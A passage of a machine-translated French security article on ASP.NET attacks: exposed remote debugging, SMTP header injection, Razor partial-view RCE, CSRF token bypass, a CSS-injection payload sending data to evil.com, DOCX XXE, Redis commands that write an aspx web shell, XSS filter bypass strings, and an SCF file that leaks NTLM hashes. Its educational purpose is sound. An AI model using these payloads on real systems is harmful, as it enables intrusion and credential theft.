fonctionnalités de débogage.  Microsoft vous permet d'utiliser un débogueur distant pour travailler sur la version de débogage de l'application. <br><br>  Si ce port est ouvert sur Internet et est protégé par un simple mot de passe ou qu'il n'y a pas de mot de passe, il est possible de récupérer un débogueur.  De plus, cela vous permettra d'influencer l'application en mode DEBUG.  Y compris l'extraction de mots de passe, la modification de la logique, la conduite du traçage, etc. <br><br>  <b>Preuve de concept</b> : <br><br><img src="https://habrastorage.org/webt/pl/f3/ba/plf3ba206usqwa10gt59go39w8k.png"><br><br>  <b>Solution:</b> utilisez un mot de passe fort et n'exposez pas le service pour le débogage. <br><br>  <b>Injection d'en-tête SMTP</b> <br><br>  <b>Description:</b> vous devez rappeler une petite spécification du protocole SMTP. <br>  Un exemple de ce à quoi ressemble un paquet de message simple SMTP: <br><br><pre> <code class="hljs powershell">Received: from mail.bieberdorf.edu (mail.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.78</span></span>]) by mailhost.immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>/<span class="hljs-number"><span class="hljs-number">8.7</span></span>.<span class="hljs-number"><span class="hljs-number">2</span></span>) with ESMTP id LAA20869 <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ; Tue, <span class="hljs-number"><span class="hljs-number">18</span></span> Mar <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">24</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) Received: from alpha.bieberdorf.edu (alpha.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.11</span></span>]) by mail.bieberdorf.edu (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>) id <span class="hljs-number"><span class="hljs-number">004</span></span>A21; Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) From: rth@bieberdorf.edu (RT Hood) To: tmh@immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com Date: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message<span class="hljs-literal"><span class="hljs-literal">-Id</span></span>: &lt;rth031897143614<span class="hljs-literal"><span class="hljs-literal">-00000298</span></span>@mail.bieberdorf.edu&gt; X<span class="hljs-literal"><span class="hljs-literal">-Mailer</span></span>: Loris v2.<span class="hljs-number"><span class="hljs-number">32</span></span>  Lunch today?</code> </pre><br>  Evidemment, en l'absence de validation de la valeur tombant dans l'en-tête "To", il est possible de rediriger la lettre vers un autre destinataire.  Mais ce serait trop simple et évident, donc la validation est déjà en cours au niveau .Net. <br><br>  Cependant, si vous introduisez un nouvel en-tête Reply-To - une adresse pour les réponses, alors de nombreux formulaires tels que "Mot de passe oublié" en prennent souvent l'adresse d'envoi, il suffit donc d'introduire des caractères de retour chariot et de saut de ligne et d'obtenir une charge de travail. <br><br><pre> <code class="hljs julia">... From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com/r/nReply-to:hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt; ...      : From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com Reply-To: hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt;</code> </pre><br>  <b><u>Exemple de code vulnérable:</u></b> <br><br><pre> <code class="hljs python">MailAddress <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> = new MailAddress(“******@mail.r<span class="hljs-string"><span class="hljs-string">u", “test"</span></span>); MailAddress to = new MailAddress(email); MailMessage m = new MailMessage(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>, to); m.Subject = <span class="hljs-string"><span class="hljs-string">""</span></span>; m.Body = <span class="hljs-string"><span class="hljs-string">"-"</span></span>; m.Headers.Add(“To<span class="hljs-string"><span class="hljs-string">", email); m.IsBodyHtml = true; SmtpClient smtp = new SmtpClient("</span></span>smtp.mail.r<span class="hljs-string"><span class="hljs-string">u", 587); smtp.Credentials = new NetworkCredential(“******@mail.ru"</span></span>, “******<span class="hljs-string"><span class="hljs-string">"); smtp.EnableSsl = true; smtp.Send(m);</span></span></code> </pre><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Bs_4_hpomig" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>Solution:</b> n'écrivez pas de code complexe, utilisez un nouveau .Net <br><br>  <b>RCE en vue partielle</b> <br><br>  <b>Description:</b> il existe deux concepts importants dans la terminologie ASP.NET MVC: <br>  <b>La vue</b> est la vue que l'utilisateur voit.  Comme déjà indiqué, grâce aux rasoirs ou aux moteurs de formulaires Web, il est possible d'implémenter du code côté serveur. <br>  <b>Vue partielle</b> - <b>Vue partielle</b> .  Cela fait partie du contenu de la vue, extrait dans un fichier séparé pour plus de commodité. <br><br>  Il est nécessaire d'avoir un champ dans la vue partielle, qui est rendu en html, et dans lequel il est possible d'entrer une charge dangereuse. <br><br>  <b>Exemple de chargement:</b> obtention du mot de passe de l'utilisateur actuel <br><br><pre> <code class="hljs css">@((<span class="hljs-keyword"><span class="hljs-keyword">Account</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">Models</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">Session</span></span>[“<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>”].<span class="hljs-keyword"><span class="hljs-keyword">Password</span></span></code> </pre> <br>  À la suite de l'accès à la vue, ce code sera exécuté.  Depuis les directives seront reconnues comme un moteur de rasoir.  La figure ci-dessous montre comment cela se produit. <br><br>  <b>Algorithme:</b> <br><br><ol><li>  L'utilisateur fait une demande au contrôleur; </li><li>  Le contrôleur rend la vue; </li><li>  A l'intérieur de la vue, une vue partielle est rencontrée, après quoi une demande est à nouveau faite au contrôleur, qui est responsable du rendu de la vue partielle; </li><li>  La vue partielle terminée est renvoyée au principal et le principal à l'utilisateur. </li></ol><br><img src="https://habrastorage.org/webt/_j/si/qs/_jsiqsyffaujvq2hikalumgdxte.png"><br><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>Un exemple simplifié</b> : <br><br><pre> <code class="hljs pgsql">@{ Html.RenderPartial("Code", html); } Controller - <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> ActionResult <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span>(string html = "") { ViewBag.Html = html; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">View</span></span>(); } Partial <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> –   @model string @{ Layout = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } @Model <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span> <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> –   @{ string html = ViewBag.Html.ToString(); } @{ Html.RenderPartial("Code", html); }</code> </pre><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>PS La</b> tentative de reproduction échoue. <br><br>  <b>Injection CSRF et CSS</b> <br><br>  Ces vulnérabilités impliquent une interaction avec l'utilisateur. <br><br>  <b>CSRF (Cross Site Request Forgery)</b> - contrefaçon de demande intersite. <br><br>  <b>Algorithme:</b> <br><br><ol><li>  L'utilisateur vient sur le site du pirate; </li><li>  Remplit les champs du formulaire; </li><li>  Les données du formulaire sont envoyées à un autre site au nom de l'utilisateur et avec son rôle; </li><li>  Ainsi, l'utilisateur, sans s'en rendre compte, a effectué certaines actions sur une autre ressource. </li></ol><br>  Pour se protéger contre ce type d'attaque, les jetons CSRF ont été inventés, en règle générale, il s'agit d'une chaîne contenant une séquence de caractères. <br><br>  Une vulnérabilité a été trouvée qui contourne la protection contre la CSRF.  Il était juste nécessaire d'utiliser une chaîne beaucoup moins que l'original comme jeton. <br><br>  <b>Jeton régulier</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj" /&gt;</code> </pre> <br>  <b>Jeton vulnérable</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="ovomyQnYPxvPXfdxrjO1JEce3zPvGn" /&gt;</code> </pre> <br>  <b>La charge pour voler le jeton via CSS (pas XSS):</b> <br>  Dans le cas où tronquer le jeton n'aide pas, vous pouvez recourir à l'attaque CSS-Injection, qui vous permet de voler le jeton de la page et de le dessiner sur votre ressource.  Grâce à cela, un véritable jeton est donné à l'utilisateur, et la demande nécessaire sur le site est faite en son nom. <br><br>  <b><u>Exemple de chargement</u></b> : <br><br><pre> <code class="hljs xml">%0A{}*{color:red;} - Test <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"s"</span></span></span><span class="hljs-tag">&gt;</span></span> secret <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/css"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">div</span></span></span><span class="css"> </span><span class="hljs-selector-id"><span class="css"><span class="hljs-selector-id">#s</span></span></span><span class="css">:: </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">-webkit-scrollbar-track-piece</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:vertical</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:increment</span></span></span><span class="css"> { </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">background</span></span></span><span class="css">: red </span><span class="hljs-built_in"><span class="css"><span class="hljs-built_in">url</span></span></span><span class="css">(//evil.com?s); } * {</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link</span></span></span><span class="css">:</span><span class="hljs-string"><span class="css"><span class="hljs-string">'javascript:alert(1)'</span></span></span><span class="css">;</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link-source</span></span></span><span class="css">: current;}</span></span></code> </pre><br>  <b>XXE dans DocX</b> <br><br>  <b>Description:</b> ASP.NET, comme d'autres technologies, utilise de nombreuses solutions tierces.  Dans l'une de ces solutions s'intégrant dans ASP.NET, la vulnérabilité XXE (XML External Entities) a été trouvée, qui consiste en une erreur d'analyse XML et la possibilité de connecter des entités externes pouvant contenir des données critiques.  En savoir plus sur XXE sur les pages <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">OWASP</a> . <br><br>  Dans ce cas, le composant est responsable du chargement et de l'analyse des fichiers docx (Microsoft World).  Étant donné que tout document Office est en fait un ensemble de fichiers xml, l'analyse peut entraîner une attaque XXE. <br><br>  <b>Algorithme:</b> <br><br><ol><li>  Document de bureau déballé; </li><li>  La charge est introduite; </li><li>  Il est compressé en tant que docx; </li><li>  Il est versé sur le serveur pour traitement, où un composant vulnérable est utilisé. </li></ol><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/gCAU9M_E2xw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>RCE via Redis</b> <br><br>  <b>Description: en</b> plus des composants vulnérables, le piratage ASP.NET peut être combiné avec des technologies vulnérables.  Par exemple, une vulnérabilité de longue date est connue dans le système de stockage RAM Redis qui permet l'exécution de code arbitraire côté serveur.  Ensuite, cette attaque sera considérée par rapport à ASP. <br><br>  <b>Algorithme:</b> <br><br><ol><li>  Connexion à Redis.  Il est important qu'il s'exécute sur le même serveur que le serveur Web; </li><li>  En exécutant la liste suivante et en utilisant un serveur Web pour afficher la page résultante, du code arbitraire sera exécuté.  Dans ce cas, appeler la calculatrice: </li></ol><br><pre> <code class="hljs swift">config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dir <span class="hljs-type"><span class="hljs-type">DIRNAME</span></span> config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dbfilename asd.aspx flushall <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span> '&lt;%@ <span class="hljs-type"><span class="hljs-type">Page</span></span> <span class="hljs-type"><span class="hljs-type">Language</span></span>=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> <span class="hljs-type"><span class="hljs-type">AutoEventWireup</span></span>=<span class="hljs-string"><span class="hljs-string">"true"</span></span> <span class="hljs-type"><span class="hljs-type">CodeBehind</span></span>=<span class="hljs-string"><span class="hljs-string">"asd.aspx.cs"</span></span> %&gt;&lt;% <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Diagnostics</span></span>.<span class="hljs-type"><span class="hljs-type">Process</span></span>.<span class="hljs-type"><span class="hljs-type">Start</span></span>(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); %&gt;' save</code> </pre><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/4p9UlWt9GMY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>Filtre XSS ByPass</b> <br><br>  ASP.NET possède son propre mécanisme pour filtrer les données des attaques de la classe XSS.  Lorsque vous essayez de transférer des caractères ou des signatures interdits, la protection suivante est déclenchée: <br><br><img src="https://habrastorage.org/webt/og/-b/me/og-bmepcexanckl1pma1l8_71q4.png"><br><br>  Cependant, il existe de nombreuses façons de contourner cette protection.  En voici quelques uns: <br><br><ul><li>  % EF% BC% 9Cimg% 20src% 3Dxxx% 20onerror% 3D <b>alert (1)</b> % EF% BC% 9E </li><li>  &lt;- / script&gt; <b>alert (1)</b> ; </li><li>  &lt;/ XSS / * - * / STYLE = xss: e / ** / xpression ( <b>alert ('XSS')</b> )&gt; </li><li>  % uff1cscript% uff1e <b>alert ('XSS')</b> ;% uff1c / script% uff1e </li></ul><br>  Dans les dernières versions, ces méthodes ne fonctionnent plus, cependant, comme déjà mentionné, la technologie ASP.NET a été créée principalement pour les grands et longs projets, de nombreuses ressources peuvent donc être affectées par cette vulnérabilité. <br><br>  <b>Fichier de commandes shell</b> <br><br>  <b>Description: Il</b> n'y a pas si longtemps, une vulnérabilité liée au navigateur Google Chrome a explosé, dont l'essence est de voler le hachage NTLM de l'utilisateur. <br><br>  <b>Algorithme:</b> <br><br>  1) Un fichier est préparé avec l'extension scf et le contenu suivant <br><br><pre> <code class="hljs markdown">[Shell] IconFile=\\<span class="hljs-strong"><span class="hljs-strong">***.**</span></span>.<span class="hljs-emphasis"><span class="hljs-emphasis">*.*</span></span>**\icon</code> </pre><br>  où au lieu des astérisques ip est l'adresse du serveur smb de l'attaquant; <br><br>  2) Lorsqu'il arrive sur l'ordinateur de l'utilisateur, ce fichier n'a même pas besoin d'être ouvert.  Il suffit que l'utilisateur accède simplement au même dossier où se trouve ce fichier.  Dès que cela se produit, un paquet de hachage sera envoyé au serveur SMB; <br><br>  3) Ainsi, le piratage d'infrastructure peut également être combiné avec des vulnérabilités simples telles que Open Redirect. <br><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/_iTsFZvvXgg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><div class="spoiler">  <b class="spoiler_title">Les références</b> <div class="spoiler_text">  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">metanit.com/sharp/mvc5/12.1.php</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">vimeo.com/35002943</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">mybasictricks.blogspot.ru/2013/10/bypassing-xss-filters.html</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">xakep.ru/2017/05/17/chrome-and-scf-files</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">michaeldaw.org/news/news-030407</a> <br>  • codeby.net (SooLFaa) <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">antichat.ru</a> (SooLFaa) </div></div><br>  <b>Merci de votre attention!</b>  Partagez votre expérience et laissez des questions à Alexei Morozov (alias <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SoolFaa</a> ) dans les commentaires de cet article. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr413649/">https://habr.com/ru/post/fr413649/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr413637/index.html">Google a publié 7 principes d'éthique de l'IA</a></li>
<li><a href="../fr413639/index.html">Smartphones protégés: qui en a besoin et en quoi diffèrent-ils les uns des autres?</a></li>
<li><a href="../fr413641/index.html">La controverse de la pensée design</a></li>
<li><a href="../fr413643/index.html">Aitracking - le meilleur détecteur de mensonge</a></li>
<li><a href="../fr413647/index.html">Découvrez qui vous êtes dans le monde du Machine Learning</a></li>
<li><a href="../fr413651/index.html">Jeu sur ordinateur: protéger les droits de propriété intellectuelle des développeurs</a></li>
<li><a href="../fr413653/index.html">Programmation probabiliste et méthode bayésienne pour les pirates</a></li>
<li><a href="../fr413655/index.html">Quels textes pour les pages de destination vendent-ils vraiment?</a></li>
<li><a href="../fr413657/index.html">Le réseau de neurones Uber reconnaît les utilisateurs dans un état «inhabituel»</a></li>
<li><a href="../fr413661/index.html">Saga des services électroniques et de leurs emplacements. Partie 1. Service électronique</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>